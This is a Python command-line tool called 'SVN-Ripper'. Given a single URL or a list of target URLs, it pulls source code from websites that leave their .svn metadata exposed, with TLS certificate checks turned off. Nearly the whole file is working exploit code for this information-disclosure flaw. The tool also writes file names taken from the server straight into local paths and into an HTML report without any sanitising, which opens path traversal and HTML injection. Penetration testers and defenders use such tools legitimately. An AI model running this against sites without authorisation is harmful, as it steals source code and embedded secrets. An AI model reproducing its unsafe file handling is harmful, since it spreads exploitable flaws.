
#!/usr/bin/env python3
# Licence: MIT
# Copyright (c) 2025 Dardan Prebreza / Pretera

import requests
import os
import gzip
import argparse
from urllib.parse import urljoin
from datetime import datetime
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def print_logo():
    print("""
███████╗██╗   ██╗███╗   ██╗      ██████╗ ██╗██████╗ ██████╗ ███████╗██████╗ 
██╔════╝██║   ██║████╗  ██║      ██╔══██╗██║██╔══██╗██╔══██╗██╔════╝██╔══██╗
███████╗██║   ██║██╔██╗ ██║█████╗██████╔╝██║██████╔╝██████╔╝█████╗  ██████╔╝
╚════██║╚██╗ ██╔╝██║╚██╗██║╚════╝██╔══██╗██║██╔═══╝ ██╔═══╝ ██╔══╝  ██╔══██╗
███████║ ╚████╔╝ ██║ ╚████║      ██║  ██║██║██║     ██║     ███████╗██║  ██║
╚══════╝  ╚═══╝  ╚═╝  ╚═══╝      ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚══════╝╚═╝  ╚═╝
              SVN-Ripper | Pretera.com
        Recover source from leaked .svn metadata
""")

def fetch_entries(url):
    entries_url = urljoin(url, '.svn/entries')
    print(f'[+] Fetching entries from: {entries_url}')
    response = requests.get(entries_url, verify=False)
    if response.status_code != 200:
        print('[-] Failed to fetch entries. HTTP', response.status_code)
        return None
    return response.text

def parse_entries(entries_content):
    lines = entries_content.splitlines()
    files = []
    i = 0
    while i < len(lines):
        line = lines[i].strip()
        if not line or line.startswith('<?xml'):
            i += 1
            continue
        if i + 1 < len(lines) and lines[i+1].strip() in ['file', 'dir']:
            filename = line
            file_type = lines[i+1].strip()
            if file_type == 'file' and not filename.endswith('/'):
                files.append(filename)
            i += 4
        else:
            i += 1
    return list(set(files))

def try_decode(data):
    try:
        return gzip.decompress(data).decode('utf-8')
    except:
        try:
            return data.decode('utf-8')
        except:
            return None

def render_html_report_template(template_path, report_data):
    with open(template_path, "r", encoding="utf-8") as f:
        template = f.read()

    rows_html = ""
    for item in report_data:
        status_class = {
            'OK': 'status-ok',
            'FAILED': 'status-failed',
            'UNDECODABLE': 'status-undecodable'
        }.get(item['status'].upper(), '')
        rows_html += (
            f"<tr>"
            f"<td>{item['file']}</td>"
            f"<td class='{status_class}'>{item['status']}</td>"
            f"<td>{item['size']}</td>"
            f"<td>{item['saved_as'] or ''}</td>"
            f"</tr>\n"
        )

    return template.replace("{date}", datetime.now().strftime("%Y-%m-%d %H:%M:%S")).replace("{rows}", rows_html)

def save_html_report(report_data, outdir, template_path):
    html_content = render_html_report_template(template_path, report_data)
    out_path = os.path.join(outdir, f'report_{datetime.now().strftime("%Y%m%d_%H%M%S")}.html')
    with open(out_path, 'w', encoding='utf-8') as f:
        f.write(html_content)
    print(f"[+] HTML report saved to {out_path}")

def download_and_decode(base_url, filepath, outdir='recovered'):
    os.makedirs(outdir, exist_ok=True)
    svn_url = urljoin(base_url, f'.svn/text-base/{filepath}.svn-base')
    output_path = os.path.join(outdir, filepath)

    print(f'[+] Downloading: {svn_url}')
    r = requests.get(svn_url, verify=False)
    if r.status_code != 200:
        print(f'[-] Failed to download {filepath} (HTTP {r.status_code})')
        return {'file': filepath, 'status': 'FAILED', 'size': len(r.content), 'saved_as': None}

    content = try_decode(r.content)
    if content:
        os.makedirs(os.path.dirname(output_path), exist_ok=True)
        with open(output_path, 'w', encoding='utf-8') as f:
            f.write(content)
        print(f'[+] Saved decoded file: {output_path}')
        return {'file': filepath, 'status': 'OK', 'size': len(r.content), 'saved_as': output_path}
    else:
        print(f'[-] Could not decode: {filepath}')
        return {'file': filepath, 'status': 'UNDECODABLE', 'size': len(r.content), 'saved_as': None}

def process_url(base_url, outdir, template_path):
    entries = fetch_entries(base_url)
    if not entries:
        return
    files = parse_entries(entries)
    print(f'[+] Found {len(files)} files:')
    for f in files:
        print('  -', f)
    results = [download_and_decode(base_url, f, outdir) for f in files]
    save_html_report(results, outdir, template_path)

def main():
    print_logo()
    parser = argparse.ArgumentParser(description='Recover source from exposed .svn folders')
    parser.add_argument('-u', '--url', help='Single target URL')
    parser.add_argument('-l', '--list', help='File with list of URLs')
    parser.add_argument('-o', '--out', default='recovered', help='Output directory')
    parser.add_argument('-t', '--template', default='html_report_template.html', help='Path to HTML template')

    args = parser.parse_args()
    if not args.url and not args.list:
        parser.error('Specify either -u for a single URL or -l for a file of URLs.')

    urls = [args.url] if args.url else open(args.list).read().splitlines()
    for url in urls:
        process_url(url.strip(), args.out, args.template)

if __name__ == '__main__':
    main()
